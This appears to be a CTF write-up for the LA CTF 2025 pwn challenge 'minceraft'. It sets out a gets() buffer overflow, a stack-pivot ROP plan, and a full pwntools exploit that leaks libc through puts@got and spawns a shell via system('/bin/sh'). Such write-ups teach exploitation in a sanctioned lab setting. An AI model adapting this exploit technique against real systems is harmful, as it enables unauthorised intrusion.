# minceraft

## challenge information
LA CTF 2025: [](https://github.com/uclaacm/lactf-archive/tree/main/2025/pwn/minceraft)

## analysis
```bash
[~/dc/ctf/la/minceraft] >>>checksec chall
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### vulnerabilities
* buffer overflow
```c
int main(void) {
  setbuf(stdout, NULL);
  while (1) {
    puts("\nM I N C E R A F T\n");
    puts("1. Singleplayer");
    puts("2. Multiplayer");
    if (read_int() != 1) {
      puts("who needs friends???");
      exit(1);
    }
    puts("Creating new world");
    puts("Enter world name:");
    char world_name[64];
    scanf(" ");
    gets(world_name);
    //---------------
```

### exploit flow・爆破脚本
1. stack pivot into writable address.
2. return to gets again
3. rop to leak libc address
4. rop to get a shell

* stack structure
```py
$rdi  0x7fffffffd920|+0x0000|+000: 0x00007ffff7fc1000  ->  0x00010102464c457f
      0x7fffffffd928|+0x0008|+001: 0x0000010101000000
      0x7fffffffd930|+0x0010|+002: 0x0000000000000002
      0x7fffffffd938|+0x0018|+003: 0x00000000178bfbff
      0x7fffffffd940|+0x0020|+004: 0x00007fffffffde69  ->  0x000034365f363878 ('x86_64'?)
      0x7fffffffd948|+0x0028|+005: 0x0000000000000064
      0x7fffffffd950|+0x0030|+006: 0x0000000000001000
      0x7fffffffd958|+0x0038|+007: 0x0000000000401090 <_start>  ->  0x89485ed18949ed31
$rbp  0x7fffffffd960|+0x0040|+008: 0x0000000000000001
      0x7fffffffd968|+0x0048|+009: 0x00007ffff7c29d90 <__libc_start_call_main+0x80>  ->  0xe80001b859e8c789  <-  retaddr[1]
```
* writable region
```Py
gef> vmmap
Start         End           Size        Perm Path
0x00000400000 0x00000401000 0x000001000 r-- minceraft/chall
0x00000401000 0x00000402000 0x000001000 r-x minceraft/chall
0x00000402000 0x00000403000 0x000001000 r-- minceraft/chall
0x00000403000 0x00000404000 0x000001000 r-- minceraft/chall
***WRITABLE***
0x00000404000 0x00000405000 0x000001000 rw- minceraft/chall
**************
```
* Rop1
```py
world_name  | A*0x40
--------------------
rbp         | writable (0x404e000)
ret addr    | *main+143 -> scanf(" ")
```
* Rop2
```py
world_name  | A*0x40
--------------------
rbp         | writable+0x20 (0x404e020)
ret addr    | *read_int+65 -> mov eax,DWORD PTR [rbp-0x4]; leave; ret;
padding     | 0x0000000000000000                    V
padding&leak| 0x0040400000000000                    |
    padding  (4)| 0x00000000                        |
    leak addr(4)| 0x00404000 <puts@got[plt]> <------J
next_rbp    | writable+30h-8h
next_ret    | *main+427 -> mov rdi,rax; call 0x401030 <puts@plt>
rop         | _start
```
* Rop3
```py
world_name  | A*0x40
--------------------
rbp         | writable (0x404e000)
ret addr    | ret;
rop         | pop rdi; ret;
rop         | &"/bin/sh\0"
rop         | system()
```

### exploit

```py
from pwn import *
import sys

e = ELF("chall",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 127.0.0.1 9999"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)

ret = 0x0000000000401016
mov_rax_rbp4 = 0x004011b7
writable = 0x404e00
mov_rdi_rax = 0x00401367

paybyte(b"A"*0x40)
add64(writable)
add64(0x000000000040124b) #scanf(" ")

r()
sl(b"1")
r()
sl(payload)
r()
sl(b"1")
r()
sl(b"2")
paybyte(b"B"*0x40)
add64(writable+0x20)
add64(mov_rax_rbp4)
add64(0x0) #padding
add64(0x40400000000000)
add64(writable+0x30-8)
add64(mov_rdi_rax)
add64(e.sym["_start"])
r()
sl(payload)
r()
sl(b"1")
print("waiting for it")
time.sleep(5)
r()
sl(b"2")
ru(b"Exit\n")
leak = rl().strip()
leak = pu64(leak)
hlog(leak)
diff = 0x724ccba80e50 - 0x0000724ccba00000
libc.address = leak - diff 
hlog(libc.address)
rop = ROP(libc, base = libc.address)
rop.call(ret)
rop.system(next(libc.search(b"/bin/sh\0")))

sl(b"2")
sl(b"1")
r()

paybyte(b"C"*0x40)
add64(writable)
addbyte(rop.chain())

sl(payload)
r()
sl(b"1")
print("waiting for it")
time.sleep(5)
r()
sl(b"2")

shell()
```
